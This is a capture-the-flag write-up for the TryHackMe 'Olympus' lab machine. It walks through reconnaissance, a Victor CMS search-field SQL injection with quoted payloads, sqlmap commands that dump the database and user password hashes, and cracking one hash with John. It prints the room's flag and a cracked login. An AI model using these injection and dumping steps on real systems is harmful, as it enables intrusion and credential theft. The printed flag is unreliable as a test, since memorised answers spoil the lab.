# Olympus
link: https://tryhackme.com/room/olympusroom
target: 10.10.207.20


## Recon
### NMAP
The recon start with a classic nmap scan with '-sV' (Probe open ports to determine service/version info) and '-sC' (equivalent to --script=default):

```bash
nmap -sC -sV 10.10.207.20

PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
|_  256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
80/tcp open  http	Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
Two ports are open in the initial nmap scan.
We can add the DNS name to our /etc/hosts file :

```bash
echo "10.10.207.20  olympus.thm" | sudo tee -a /etc/hosts
```
---
### Browse Website
Now, we can try to browse to the page http://olympus.thm/
> http://olympus.thm
![http://olympus.thm/](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_olympus.thm.png?raw=true)
> Wappalyzer
![Wappalyzer](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_wappalyzer_olympus.thm.png?raw=true)

We can add some informations to our notes:
> mail: root@the-it-departement
> user: root
> domain: the-it-departement


Before launch a gobuster to fuzz the main page, we can try some path like 'index.html' or 'index.php' to check extension file :

> index.html
```bash
curl http://olympus.thm/index.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at olympus.thm Port 80</address>
</body></html>
```
> index.php
```
curl http://olympus.thm/index.php 
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta charset="utf-8">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Olympus</title>
  <!-- Meta -->
  <meta name="Content-Language" content="en">
  <meta name="Keywords" content="AperiSolve, Apérisolve, Aperi'Solve, Apéri'Solve, Zeecka">
  <meta name="Author" content="Zeecka">
  <meta name="Robots" content="all">
  <meta name="theme-color" content="#42f4c5">
  <link rel="shortcut icon" type="image/x-icon" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="icon" type="image/png" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
  <link href="http://olympus.thm/static/normalize.css" rel="stylesheet">
  <link href="http://olympus.thm/static/style.css" rel="stylesheet">
  <script src="http://olympus.thm/static/particles.min.js"></script>
</head>
<body>
  <br></br>
  <div id="parentmain">
    <div id="parenthome">
      <h1 id="logo">Olympus v2</h1>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <div id="mainform">
	<div id="file-drag">
            <div id="start">
              <div>The website is still under developpment.</div>
              <div id="notimage" class="hidden">If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.</div>
            </div>
      </div>
  <div id="particles-js"></div>
  <script>particlesJS.load('particles-js', 'http://olympus.thm/static/particles.json', function () { });</script>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</html>
```
We can see the .php extension works, so we can add '-x php' to our gobuster command to find some .php files :

### GOBUSTER

```bash
gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -x php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/01 11:09:31 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
Progress: 9120 / 9230 (98.81%)
===============================================================
2023/03/01 11:10:01 Finished
===============================================================
```

---
We have find some path, so go check if you find some information on  http://olympus.thm/~webmaster/

![http://olympus.thm/~webmaster/](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Victor_CMS.png?raw=true)

Great, we have find some interesting stuff, like search and login fonction.

Let's first check if there are any **Victor CMS** vulnerabilities in **exploit-db** with **searchsploit** command line tools:

```bash
searchsploit "Victor CMS"                                         
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                                                                        | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                                                                            | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                                                                              | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                                                                            | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                                                               | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                                                                | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                                                                            | php/webapps/49282.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**Searchsploit** shows me several known exploits, let's try first the exploit for the **'Search' SQL Injection**
```bash
cat /usr/share/exploitdb/exploits/php/webapps/48734.txt           
# Exploit Title: Victor CMS 1.0 - 'Search' SQL Injection
# Date: 2020-08-04
# Exploit Author: Edo Maland
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: XAMPP / Windows 10

-------------------------------------------------------------------------------------------------------------------------------------
# Discription:
# The Victor CMS v1.0 application is vulnerable to SQL injection via the 'search' parameter on the search.php page.

# Feature: Search
# Vulnerable file: search.php
# Vulnerable parameter :
	- search
# PoC

Url : http://example.com/CMSsite/search.php
Methode : Post (search="[SQLi]"&submit)

Payload : 1337'union+select+1,2,version(),database(),5,6,7,8,9,10 -- -

# Burpsuite Requests

POST /CMSsite/search.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Connection: close
Referer: http://example.com/CMSsite/search.php
Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
Upgrade-Insecure-Requests: 1

search=1337'union+select+1,2,version(),databases(),5,6,7,8,9,10%20--%20-&submit=

# Sqlmap Command

sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```

Let's open **Burp** to try the **'search' SQL Injection** exploit:
![Burp_SQLI_search](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/BURP_search_SQLI.png?raw=true)


It works! Now we can run sqlmap to find the Injections :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:53:01 /2023-03-01/

[11:53:01] [DEBUG] cleaning up configuration parameters
[11:53:01] [DEBUG] setting the HTTP timeout
[11:53:01] [DEBUG] setting the HTTP User-Agent header
[11:53:01] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.20) Gecko/20081217 Firefox(2.0.0.20)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [DEBUG] creating HTTP requests opener object
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[11:53:01] [DEBUG] used the default behavior, running in batch mode
[11:53:01] [INFO] resuming back-end DBMS 'mysql' 
[11:53:01] [DEBUG] resolving hostname 'olympus.thm'
[11:53:01] [INFO] testing connection to the target URL
[11:53:02] [DEBUG] declared web page charset 'utf-8'
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=uet6a1mao4v...fko6o9891g'). Do you want to use those [Y/n] Y
[11:53:02] [DEBUG] used the default behavior, running in batch mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=1337' OR NOT 8708=8708#&submit=
    Vector: OR NOT [INFERENCE]#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=1337' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(3391=3391,1))),0x7170627671),3391)-- RlNq&submit=
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1337' AND (SELECT 5227 FROM (SELECT(SLEEP(5)))Btsm)-- LvuX&submit=
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=1337' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767071,0x79476663707a55546148776255486644694d567a5163484b4f464f74476a49794e71766d51646153,0x7170627671),NULL,NULL,NULL#&submit=
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL#
---
[11:53:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[11:53:02] [INFO] fetching database names
[11:53:02] [DEBUG] resuming configuration option 'string' ('result')
[11:53:02] [DEBUG] performed 0 queries in 0.00 seconds
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[11:53:02] [INFO] fetched data logged to text files under '/home/rawmain/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 11:53:02 /2023-03-01/
```


We have just found several databases, let's try to find some information in the **olympus** database:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --tables olympus
...
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
...
```

We can try to dump the '**flag**' table:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T flag
...
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
...
```

Great! We have found the first flag !

---
Let's stay focused and keep looking for other information in the database, like the '**users**' table :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T users
...
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

We have just found some interesting information: 
- **Users** :
	- prometheus
	- root
	- zeus
- **Mail addresses**:
	- prometheus@olympus.thm
	- root@chat.olympus.thm
	- zeus@chat.olympus.thm
- **Users passwords hash**:
	- $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
	- $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
	- $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
- **New subdomain**:
	- chat.olympus.thm

We create a **users.hash** file which contains the hashes of the users to try to crack them later.

```bash
cat users_hash.txt                                          
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

add the new subdomain to our **/etc/hosts** file:

```bash
cat /etc/hosts

# tryHackMe
10.10.207.20  olympus.thm chat.olympus.thm
```

add the users found in a **databaseUsers.txt** file:

```bash
cat databaseUsers.txt                             
prometheus
root
zeus
```

Try to identify the hash format  with **hashid**:
```bash
hashid users_hash.txt
--File 'hash/users_hash.txt'--
Analyzing '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash/users_hash.txt'-- 
```


Crack **users_hash.txt** file:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt users_hash.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)   
...
```


John have cracked a hash, we can try to login to the chat.olympus.thm page with this creds:
> user: prometheus
> password: summertime

### Webpage Login: http://olympus.thm/~webmaster/admin/
![Login_webmaster Page](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_webmaster_login.png?raw=true)

![Succes webmaster_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_webmasterAdminPage.png?raw=true)


### Webpage Login: http://chat.olympus.thm/home.php

![Login chat.olympus_Page](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Login_chat.png?raw=true)

![Succes chat.olympus_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_chat.olympus.thm.png?raw=true)


